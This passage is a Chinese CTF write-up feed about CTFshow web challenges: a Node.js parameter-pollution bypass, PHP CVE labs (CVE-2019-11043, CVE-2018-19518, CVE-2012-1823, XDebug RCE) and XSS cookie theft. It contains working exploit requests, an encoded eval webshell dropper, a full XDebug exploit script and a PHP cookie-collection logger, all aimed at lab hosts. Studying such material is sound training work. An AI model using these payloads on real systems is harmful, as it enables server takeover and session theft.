class="property">isVIP</span>===<span class="literal">true</span>)&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag. :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>?query=&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125;</code>逗号会被过滤。url</p><blockquote><p>node.js处理的特点和JSON.parse，另外一个点就是req.url是经过url编码的、</p></blockquote><p>但是%2c中的2c也被过滤掉了。<br>HTTP协议中允许同名参数出现多次，不同服务端对同名参数处理都是不一样的。<br>nodejs处理传入数组时，不像php那样，后面get传的query值会覆盖前面的，而是会把这些值都放进一个数组中。而JSON.parse居然会把数组中的字符串都拼接到一起，再看满不满足格式，满足就进行解析。<br>也即是如下payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query=&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;admin&quot;</span>&amp;query=<span class="string">&quot;password&quot;</span>:<span class="string">&quot;%63tfshow&quot;</span>&amp;query=<span class="string">&quot;isVIP&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这里把c进行url编码，是因为双引号的url编码是 %22，和c连接起来就是 %22c，会匹配到正则表达式。</p></blockquote><p>（这里始终没理解，有2c的话不就直接寄了吗？怎么能传进去。）</p><h2 id="传入解析"><a href="#传入解析" class="headerlink" title="传入解析"></a>传入解析</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Web</span>服务器 　　　　　　 参数获取函数 　　　　　　　　　　   获取到的参数</span><br><span class="line"></span><br><span class="line"><span class="variable constant_">PHP</span>/<span class="title class_">Apache</span>　　 　　  $_GET(“par”) 　　　　　　　　　　 <span class="title class_">Last</span></span><br><span class="line"></span><br><span class="line"><span class="variable constant_">JSP</span>/<span class="title class_">Tomcat</span> 　　　　  <span class="title class_">Request</span>.<span class="title function_">getParameter</span>(“par”)    <span class="title class_">First</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Perl</span>(<span class="variable constant_">CGI</span>)/<span class="title class_">Apache</span> 　 <span class="title class_">Param</span>(“par”) 　　　　　　　　　　 <span class="title class_">First</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Python</span>/<span class="title class_">Apache</span> 　　  <span class="title function_">getvalue</span>(“par”) 　　　　　　　　  <span class="title class_">All</span>(<span class="title class_">List</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable constant_">ASP</span>/<span class="variable constant_">IIS</span> 　　　　　　 <span class="title class_">Request</span>.<span class="title class_">QueryString</span>(“par”) 　　 <span class="title class_">All</span> (comma-delimited string)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web311-web315phpCVE</title>
      <link href="/2023/12/08/web311-web315phpCVE/"/>
      <url>/2023/12/08/web311-web315phpCVE/</url>
      
        <content type="html"><![CDATA[<h1 id="web311"><a href="#web311" class="headerlink" title="web311"></a>web311</h1><h3 id="CVE-2019-11043远程代码执行漏洞"><a href="#CVE-2019-11043远程代码执行漏洞" class="headerlink" title="CVE-2019-11043远程代码执行漏洞"></a>CVE-2019-11043远程代码执行漏洞</h3><p>抓包，版本7.1.33。<br>这个复现得需要go环境，装一下：<br><code>sudo apt install golang</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> https:<span class="comment">//github.com/neex/phuip-fpizdam.git</span></span><br><span class="line">cd phuip-fpizdam</span><br><span class="line">go get -v &amp;&amp; go build</span><br></pre></td></tr></table></figure><p>执行go get -v &amp;&amp; go build会一直没反应<br>因为go proxy默认为proxy.golang.org，国内无法访问<br>执行命令换代理：go env -w GOPROXY=<a href="https://goproxy.cn/">https://goproxy.cn</a><br>再次执行go get -v &amp;&amp; go build<br>最后使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go run . <span class="string">&quot;地址/index.php&quot;</span></span><br></pre></td></tr></table></figure><p>末尾的index.php必须要加。<br>我再本地搭的用不了，拿vps打了一下就能用了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@hcss-ecs-<span class="number">8320</span>:~/phui/phuip-fpizdam<span class="comment"># go run . &quot;http://24f960ac-d8d8-45be-8ba0-f5bb12ba5cb1.challenge.ctf.show/index.php&quot;</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">09</span>/<span class="number">17</span> <span class="number">20</span>:<span class="number">37</span>:<span class="number">46</span> Base status code is <span class="number">200</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">09</span>/<span class="number">17</span> <span class="number">20</span>:<span class="number">37</span>:<span class="number">49</span> Status code <span class="number">502</span> <span class="keyword">for</span> qsl=<span class="number">1765</span>, adding <span class="keyword">as</span> a candidate</span><br><span class="line"><span class="number">2023</span>/<span class="number">09</span>/<span class="number">17</span> <span class="number">20</span>:<span class="number">37</span>:<span class="number">50</span> The target is probably vulnerable. Possible QSLs: [<span class="number">1755</span> <span class="number">1760</span> <span class="number">1765</span>]</span><br><span class="line"><span class="number">2023</span>/<span class="number">09</span>/<span class="number">17</span> <span class="number">20</span>:<span class="number">38</span>:<span class="number">10</span> Attack params found: --qsl <span class="number">1760</span> --pisos <span class="number">237</span> --skip-detect</span><br><span class="line"><span class="number">2023</span>/<span class="number">09</span>/<span class="number">17</span> <span class="number">20</span>:<span class="number">38</span>:<span class="number">10</span> Trying to set <span class="string">&quot;session.auto_start=0&quot;</span>...</span><br><span class="line"><span class="number">2023</span>/<span class="number">09</span>/<span class="number">17</span> <span class="number">20</span>:<span class="number">38</span>:<span class="number">12</span> <span class="title function_ invoke__">Detect</span>() returned attack params: --qsl <span class="number">1760</span> --pisos <span class="number">237</span> --skip-detect &lt;-- REMEMBER THIS</span><br><span class="line"><span class="number">2023</span>/<span class="number">09</span>/<span class="number">17</span> <span class="number">20</span>:<span class="number">38</span>:<span class="number">12</span> Performing attack using php.ini settings...</span><br><span class="line"><span class="number">2023</span>/<span class="number">09</span>/<span class="number">17</span> <span class="number">20</span>:<span class="number">38</span>:<span class="number">14</span> Success! Was able to execute a command by appending <span class="string">&quot;?a=/bin/sh+-c+&#x27;which+which&#x27;&amp;&quot;</span> to URLs</span><br><span class="line"><span class="number">2023</span>/<span class="number">09</span>/<span class="number">17</span> <span class="number">20</span>:<span class="number">38</span>:<span class="number">14</span> Trying to cleanup /tmp/a...</span><br><span class="line"><span class="number">2023</span>/<span class="number">09</span>/<span class="number">17</span> <span class="number">20</span>:<span class="number">38</span>:<span class="number">14</span> Done!</span><br></pre></td></tr></table></figure><p>之后传入参后不是每次都可以执行，需要多次尝试。<br>GET给a传入linux命令就行了。</p><h1 id="web312"><a href="#web312" class="headerlink" title="web312"></a>web312</h1><h3 id="CVE-2018-19518"><a href="#CVE-2018-19518" class="headerlink" title="CVE-2018-19518"></a>CVE-2018-19518</h3><blockquote><p>php imap扩展用于在PHP中执行邮件收发操作。其imap_open函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。<br>因为ssh命令中可以通过设置-oProxyCommand=来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。</p></blockquote><p>php5.6.38<br>先抓包，然后对payload进行修改。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br><span class="line">base64加密一下，并添加：</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+&quot;</span> | base64 -d &gt;/<span class="keyword">var</span>/www/html/shell.php</span><br><span class="line">在进行一次base64加密：</span><br><span class="line">ZWNobyAiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTVYwcE96OCsiIHwgYmFzZTY0IC1kID4vdmFyL3d3dy9odG1sL3NoZWxsLnBocA==</span><br><span class="line">再进行url编码</span><br><span class="line">ZWNobyAiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTVYwcE96OCsiIHwgYmFzZTY0IC1kID4vdmFyL3d3dy9odG1sL3NoZWxsLnBocA%<span class="number">3</span>D%<span class="number">3</span>D</span><br></pre></td></tr></table></figure><p>然后将hostname的内容修改为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x+-oProxyCommand%<span class="number">3</span>decho%<span class="number">09</span>编码后的内容|base64%<span class="number">09</span>-d|sh&#125;a</span><br></pre></td></tr></table></figure><p>也就是payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x+-oProxyCommand%<span class="number">3</span>decho%<span class="number">09</span>ZWNobyAiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTVYwcE96OCsiIHwgYmFzZTY0IC1kID4vdmFyL3d3dy9odG1sL3NoZWxsLnBocA|base64%<span class="number">09</span>-d|sh&#125;a</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: eeb206e9-<span class="number">41</span>fa-<span class="number">4</span>de4-a081-fd0d924d3284.challenge.ctf.show</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">65.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">65.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Referer: http://eeb206e9-41fa-4de4-a081-fd0d924d3284.challenge.ctf.show/</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 180</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">hostname=x+-oProxyCommand%3decho%09ZWNobyAiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTVYwcE96OCsiIHwgYmFzZTY0IC1kID4vdmFyL3d3dy9odG1sL3NoZWxsLnBocA|base64%09-d|sh&#125;a&amp;username=123&amp;password=123</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694956213914-49a80688-3d4b-4851-b44e-25c2bce60139.png" alt="image.png"><br>虽然报错但是已经将马写进去了。<br>然后传参即可：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1694956313975-38a36cea-bf6f-4341-8306-d7a229240a96.png" alt="image.png"></p><h1 id="web313"><a href="#web313" class="headerlink" title="web313"></a>web313</h1><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html">https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html</a></p></blockquote><h3 id="CVE-2012-1823"><a href="#CVE-2012-1823" class="headerlink" title="CVE-2012-1823"></a>CVE-2012-1823</h3><p>cgi模式下有如下一些参数可用：</p><ul><li>-c 指定php.ini文件的位置</li><li>-n 不要加载php.ini文件</li><li>-d 指定配置项</li><li>-b 启动fastcgi进程</li><li>-s 显示文件源码</li><li>-T 执行指定次该文件</li><li>-h和-? 显示帮助</li></ul><p>使用方法比如就是<code>?-s</code>显示源码。<br>poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?-d+allow_url_include%<span class="number">3</span>don+-d+auto_prepend_file%<span class="number">3</span>dphp%<span class="number">3</span>a<span class="comment">//input HTTP/1.1</span></span><br><span class="line">Host: <span class="number">7</span>bdb7492-e4fc-<span class="number">40</span>cf-<span class="number">94</span>ab-<span class="number">84870</span>c199bca.challenge.ctf.show</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 29</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?php echo system(&quot;ls&quot;); ?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="web314"><a href="#web314" class="headerlink" title="web314"></a>web314</h1><h3 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h3><p>目录穿越一下先。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695117285137-df0dc08d-7014-473c-a2ae-f1a0fac66aaa.png" alt="image.png"><br>nginx读一下日志。<code>/var/log/nginx/access.log</code><br>能正常访问，直接写马。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695117477277-905c3686-1644-422f-925c-68bc22ffc2d2.png" alt="image.png"></p><h1 id="web315（没成功）"><a href="#web315（没成功）" class="headerlink" title="web315（没成功）"></a>web315（没成功）</h1><blockquote><p><a href="https://blog.ricterz.me/posts/Xdebug:%20A%20Tiny%20Attack%20Surface">https://blog.ricterz.me/posts/Xdebug:%20A%20Tiny%20Attack%20Surface</a></p></blockquote><h3 id="XDebug-远程调试漏洞"><a href="#XDebug-远程调试漏洞" class="headerlink" title="XDebug 远程调试漏洞"></a>XDebug 远程调试漏洞</h3><p>PHP/7.1.12，XDebug是PHP的一个扩展，用于调试PHP代码。如果目标开启了远程调试模式，并设置remote_connect_back = 1：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xdebug.remote_connect_back = <span class="number">1</span></span><br><span class="line">xdebug.remote_enable = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>这个配置下，我们访问<a href="http://target/index.php?XDEBUG_SESSION_START=phpstorm%EF%BC%8C%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84XDebug%E5%B0%86%E4%BC%9A%E8%BF%9E%E6%8E%A5%E8%AE%BF%E9%97%AE%E8%80%85%E7%9A%84IP%EF%BC%88%E6%88%96X-Forwarded-For%E5%A4%B4%E6%8C%87%E5%AE%9A%E7%9A%84%E5%9C%B0%E5%9D%80%EF%BC%89%E5%B9%B6%E9%80%9A%E8%BF%87dbgp%E5%8D%8F%E8%AE%AE%E4%B8%8E%E5%85%B6%E9%80%9A%E4%BF%A1%EF%BC%8C%E6%88%91%E4%BB%AC%E9%80%9A%E8%BF%87dbgp%E4%B8%AD%E6%8F%90%E4%BE%9B%E7%9A%84eval%E6%96%B9%E6%B3%95%E5%8D%B3%E5%8F%AF%E5%9C%A8%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8FPHP%E4%BB%A3%E7%A0%81%E3%80%82">http://target/index.php?XDEBUG_SESSION_START=phpstorm，目标服务器的XDebug将会连接访问者的IP（或X-Forwarded-For头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。</a><br>漏洞利用：<br>因为需要使用dbgp协议与目标服务器通信，所以无法用http协议复现漏洞<br>有已经编写好的脚本：<a href="https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py">https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line">import re</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">import argparse</span><br><span class="line">import socket</span><br><span class="line">import base64</span><br><span class="line">import binascii</span><br><span class="line"><span class="keyword">from</span> concurrent.futures import ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = <span class="title function_ invoke__">ThreadPoolExecutor</span>(<span class="number">1</span>)</span><br><span class="line">session = requests.<span class="title function_ invoke__">session</span>()</span><br><span class="line">session.headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">recv_xml</span>(sock):</span><br><span class="line">    blocks = []</span><br><span class="line">    data = b<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> True:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = data + sock.<span class="title function_ invoke__">recv</span>(<span class="number">1024</span>)</span><br><span class="line">        except socket.error <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> not data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> data:</span><br><span class="line">            eop = data.<span class="title function_ invoke__">find</span>(b<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> eop &lt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            blocks.<span class="title function_ invoke__">append</span>(data[:eop])</span><br><span class="line">            data = data[eop+<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="title function_ invoke__">len</span>(blocks) &gt;= <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> blocks[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">trigger</span>(url):</span><br><span class="line">    time.<span class="title function_ invoke__">sleep</span>(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        session.<span class="title function_ invoke__">get</span>(url + <span class="string">&#x27;?XDEBUG_SESSION_START=phpstorm&#x27;</span>, timeout=<span class="number">0.1</span>)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.<span class="title function_ invoke__">ArgumentParser</span>(description=<span class="string">&#x27;XDebug remote debug code execution.&#x27;</span>)</span><br><span class="line">    parser.<span class="title function_ invoke__">add_argument</span>(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--code&#x27;</span>, required=True, help=<span class="string">&#x27;the code you want to execute.&#x27;</span>)</span><br><span class="line">    parser.<span class="title function_ invoke__">add_argument</span>(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--target&#x27;</span>, required=True, help=<span class="string">&#x27;target url.&#x27;</span>)</span><br><span class="line">    parser.<span class="title function_ invoke__">add_argument</span>(<span class="string">&#x27;-l&#x27;</span>, <span class="string">&#x27;--listen&#x27;</span>, <span class="keyword">default</span>=<span class="number">9000</span>, type=<span class="keyword">int</span>, help=<span class="string">&#x27;local port&#x27;</span>)</span><br><span class="line">    args = parser.<span class="title function_ invoke__">parse_args</span>()</span><br><span class="line">    </span><br><span class="line">    ip_port = (<span class="string">&#x27;0.0.0.0&#x27;</span>, args.listen)</span><br><span class="line">    sk = socket.<span class="title function_ invoke__">socket</span>()</span><br><span class="line">    sk.<span class="title function_ invoke__">settimeout</span>(<span class="number">10</span>)</span><br><span class="line">    sk.<span class="title function_ invoke__">bind</span>(ip_port)</span><br><span class="line">    sk.<span class="title function_ invoke__">listen</span>(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    pool.<span class="title function_ invoke__">submit</span>(trigger, args.target)</span><br><span class="line">    conn, addr = sk.<span class="title function_ invoke__">accept</span>()</span><br><span class="line">    conn.<span class="title function_ invoke__">sendall</span>(b<span class="string">&#x27;&#x27;</span>.<span class="title function_ invoke__">join</span>([b<span class="string">&#x27;eval -i 1 -- &#x27;</span>, base64.<span class="title function_ invoke__">b64encode</span>(args.code.<span class="title function_ invoke__">encode</span>()), b<span class="string">&#x27;\x00&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    data = <span class="title function_ invoke__">recv_xml</span>(conn)</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&#x27;[+] Recieve data: &#x27;</span> + data.<span class="title function_ invoke__">decode</span>())</span><br><span class="line">    g = re.<span class="title function_ invoke__">search</span>(rb<span class="string">&#x27;&lt;\!\[CDATA\[([a-z0-9=\./\+]+)\]\]&gt;&#x27;</span>, data, re.I)</span><br><span class="line">    <span class="keyword">if</span> not g:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&#x27;[-] No result...&#x27;</span>)</span><br><span class="line">        sys.<span class="keyword">exit</span>(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    data = g.<span class="title function_ invoke__">group</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&#x27;[+] Result: &#x27;</span> + base64.<span class="title function_ invoke__">b64decode</span>(data).<span class="title function_ invoke__">decode</span>())</span><br><span class="line">    except binascii.<span class="built_in">Error</span>:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&#x27;[-] May be not string result...&#x27;</span>)</span><br></pre></td></tr></table></figure><p>部署一下尝试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@hcss-ecs-<span class="number">8320</span>:~/test<span class="comment"># python3 exp.py -t http://pwn.challenge.ctf.show:28100/ -c &#x27;shell_exec(&quot;ls /&quot;);&#x27;</span></span><br><span class="line"><span class="title function_ invoke__">Traceback</span> (most recent call last):</span><br><span class="line">  File <span class="string">&quot;/root/test/exp.py&quot;</span>, line <span class="number">65</span>, in &lt;module&gt;</span><br><span class="line">    conn, addr = sk.<span class="title function_ invoke__">accept</span>()</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python3.10/socket.py&quot;</span>, line <span class="number">293</span>, in accept</span><br><span class="line">    fd, addr = <span class="built_in">self</span>.<span class="title function_ invoke__">_accept</span>()</span><br><span class="line">TimeoutError: timed out</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可能是环境出问题了，没有复现成功。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web316-web333XSS篇</title>
      <link href="/2023/09/20/web316-web333XSS%E7%AF%87/"/>
      <url>/2023/09/20/web316-web333XSS%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="提前准备"><a href="#提前准备" class="headerlink" title="提前准备"></a>提前准备</h1><p>准备几个XSS注入网站：<br>如<a href="https://xsshs.cn/%EF%BC%8Chttps://xss.pt/%EF%BC%8Chttp://xsscom.com%E5%8E%BB%E7%94%9F%E6%88%90xss%E9%93%BE%E6%8E%A5">https://xsshs.cn/，https://xss.pt/，http://xsscom.com去生成xss链接</a><br>当然，除此之外，也可以自己编写：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h1><p>后台bot会自动访问你的连接，我们只需要写一段恶意XSS内容即可。<br>这里用<a href="https://xss.pt/">https://xss.pt/</a>进行复现。<br>注册好后，创建项目之后，把获取cookie添加上。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695119320621-77e0dee8-617b-4248-a848-74d42e647038.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695119451635-6630fbfb-343a-44ed-9546-687032cca715.png" alt="image.png"><br>好像抓到的是自己🤔。<br>那就试一试写在自己的VPS上。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span 